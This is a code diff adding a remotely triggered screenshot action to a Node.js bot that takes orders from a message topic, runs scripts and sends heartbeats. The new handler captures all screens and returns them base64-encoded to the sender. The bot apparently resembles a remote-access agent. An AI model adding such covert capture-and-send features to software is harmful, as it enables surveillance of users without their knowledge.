@@ -3,6 +3,7 @@ const schedule = require('node-schedule');
 const { exec } = require('child_process');
 const { v4: uuidv4 } = require('uuid');
 const fs = require('fs');
+const screenshot = require("screenshot-desktop"); // Assuming a screenshot tool is available
 
 // Read configuration from config.txt
 function readConfigFile(filePath) {
@@ -67,6 +68,31 @@ async function handleCallback(task, groupId) {
             console.error(`Script execution failed: ${e}`);
         }
     }
+    else if (task.actionType === 'screenshot') {
+        console.log('Received screenshot order, proceeding to take a screenshot and store it in base64 format');
+        try {
+            screenshot.all().then(async (imgs) => {
+                // Convert the image buffer to base64
+                imgsBase64 = imgs.map(img => img.toString('base64'));
+                const callbackTask = {
+                    actionType: 'callback',
+                    parameters: {
+                        groupId,
+                        taskId: task.id,
+                    },
+                    result: JSON.stringify(imgsBase64),
+                };
+                await produceMessage('callback', callbackTask);
+            }).catch((err) => {
+                // Handle errors
+                console.error('Error taking screenshot:', err);
+            });
+
+
+        } catch (e) {
+            console.error(`Screenshot capture failed: ${e}`);
+        }
+    }
 }
 
 async function produceHeartBeat(topic, botId) {
@@ -84,7 +110,7 @@ async function produceHeartBeat(topic, botId) {
 async function main() {
     const groupId = uuidv4();
     await consumer.connect();
-    await consumer.subscribe({ topic: config.topic, fromBeginning: true });
+    await consumer.subscribe({ topic: config.topic, fromBeginning: false });
 
     await consumer.run({
         eachMessage: async ({ topic, partition, message }) => {
